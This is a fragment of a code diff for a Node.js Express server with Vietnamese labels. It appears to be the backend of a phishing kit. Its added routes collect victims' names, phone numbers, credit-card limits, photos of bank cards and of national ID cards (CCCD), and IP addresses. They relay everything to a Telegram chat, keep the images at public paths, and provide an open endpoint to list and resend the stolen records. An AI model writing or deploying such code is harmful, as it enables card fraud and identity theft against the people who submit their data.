+        return res.status(400).json({ status: 'err', error: 'missing_payload' });
+    }
+
+    // Build message lines
+    const lines = ['📩 <b>PHIÊN GỬI THÔNG TIN</b>', `Phiên: <code>${sessionId}</code>`];
+    if (page) lines.push(`Trang: <code>${page}</code>`);
+    if (fullName) lines.push(`Họ và Tên: <b>${fullName}</b>`);
+    if (limitGranted !== undefined && limitGranted !== null) lines.push(`Hạn Mức Được Cấp: <code>${limitGranted}</code>`);
+    if (limitAvailable !== undefined && limitAvailable !== null) lines.push(`Hạn Mức Khả Dụng: <code>${limitAvailable}</code>`);
+    if (phone) lines.push(`SDT: <code>${phone}</code>`);
+    lines.push(`Thời gian: <code>${new Date().toISOString()}</code>`);
+    lines.push(`IP: <code>${req.ip}</code>`);
+
+    // Save images (if provided as data URLs). We store public paths so they can be inspected.
+    const saved = {};
+    if (cardImage) {
+        const p = saveDataUrl(cardImage, 'card');
+        if (p) saved.cardImage = p;
+    }
+    if (cccdImage) {
+        const p2 = saveDataUrl(cccdImage, 'cccd');
+        if (p2) saved.cccdImage = p2;
+    }
+
+    const textMessage = lines.join('\n');
+
+    // Send text first
+    telegramSend(textMessage).catch(() => { });
+
+    // If images saved and telegram configured, send them as photos with caption linking to session
+    try {
+        if (saved.cardImage) {
+            // caption include session and brief info
+            const caption = `Thẻ — Phiên: <code>${sessionId}</code>\nHọ tên: ${fullName || '-'}\nSDT: ${phone || '-'} `;
+            await telegramSendPhoto(saved.cardImage, caption).catch(() => { });
+        }
+        if (saved.cccdImage) {
+            const caption = `CCCD — Phiên: <code>${sessionId}</code>\nHọ tên: ${fullName || '-'} `;
+            await telegramSendPhoto(saved.cccdImage, caption).catch(() => { });
+        }
+    } catch (e) {
+        // ignore individual photo errors
+    }
+
+    // Record the consolidated update (include saved file paths)
+    recordFieldUpdate({ sessionId, fullName, limitGranted, limitAvailable, phone, page, ...saved, ip: req.ip });
+    res.json({ status: 'ok', saved });
+});
+
+// Debug: read recent field updates
+app.get('/api/field-updates', (req, res) => {
+    res.json({ count: fieldUpdates.length, updates: fieldUpdates.slice(-100).reverse() });
+});
+
+// Re-send stored updates to Telegram (text + saved photos)
+// POST /api/telegram/resend
+// Body: { lastN?: number, sessionId?: string }
+app.post('/api/telegram/resend', async (req, res) => {
+    if (!telegramEnabled()) return res.status(400).json({ status: 'err', error: 'not_configured' });
+    const { lastN = 10, sessionId } = req.body || {};
+    let candidates = fieldUpdates.slice(-Math.max(0, Number(lastN) || 0));
+    if (sessionId) candidates = fieldUpdates.filter((u) => u.sessionId === sessionId);
+
+    const results = [];
+    for (const u of candidates) {
+        try {
+            const lines = ['📩 <b>PHIÊN GỬI THÔNG TIN (RESEND)</b>', `Phiên: <code>${u.sessionId}</code>`];
+            if (u.page) lines.push(`Trang: <code>${u.page}</code>`);
+            if (u.fullName) lines.push(`Họ và Tên: <b>${u.fullName}</b>`);
+            if (u.limitGranted) lines.push(`Hạn Mức Được Cấp: <code>${u.limitGranted}</code>`);
+            if (u.limitAvailable) lines.push(`Hạn Mức Khả Dụng: <code>${u.limitAvailable}</code>`);
+            if (u.phone) lines.push(`SDT: <code>${u.phone}</code>`);
+            if (u.field && u.value) lines.push(`Trường: <code>${u.field}</code> — Giá trị: <code>${u.value}</code>`);
+            lines.push(`Thời gian: <code>${u.receivedAt || new Date().toISOString()}</code>`);
+
+            const textResult = await telegramSend(lines.join('\n'));
+            const photoResults = [];
+            if (u.cardImage) {
+                const r = await telegramSendPhoto(u.cardImage, `Thẻ — Phiên: <code>${u.sessionId}</code>`).catch(() => null);
+                photoResults.push({ type: 'cardImage', result: r });
+            }
+            if (u.cccdImage) {
+                const r2 = await telegramSendPhoto(u.cccdImage, `CCCD — Phiên: <code>${u.sessionId}</code>`).catch(() => null);
+                photoResults.push({ type: 'cccdImage', result: r2 });
+            }
+            results.push({ sessionId: u.sessionId, textResult, photoResults });
+        } catch (e) {
+            results.push({ sessionId: u.sessionId, error: e.message });
+        }
+    }
+    res.json({ status: 'ok', count: candidates.length, results });
+});
+
+/* ============================
+ * JSON parse error handler
+ * ============================ */
+app.use((err, req, res, next) => {
+    if (err && err.type === 'entity.parse.failed') {
+        return res.status(400).json({ status: 'err', error: 'invalid_json' });
+    }
+    next(err);
+});
+
+/* ============================
+ * Start server with fallback ports
+ * ============================ */
+const HOST = process.env.HOST || '127.0.0.1';
+const MAX_TRIES = 10;
+let basePort = parseInt(process.env.PORT, 10) || 4000;
+
+function startWithFallback(port, attempt = 0) {
+    const server = app.listen(port, HOST, () => {
+        console.log(`Server listening on http://${HOST}:${port}`);
+    });
+    server.on('error', (err) => {
+        if (err.code === 'EADDRINUSE' && attempt < MAX_TRIES) {
+            console.warn(`Port ${port} in use, trying ${port + 1}...`);
+            startWithFallback(port + 1, attempt + 1);
+        } else {
+            console.error('Failed to start server:', err);
+            process.exit(1);
+        }
+    });
+}
+
+startWithFallback(basePort);
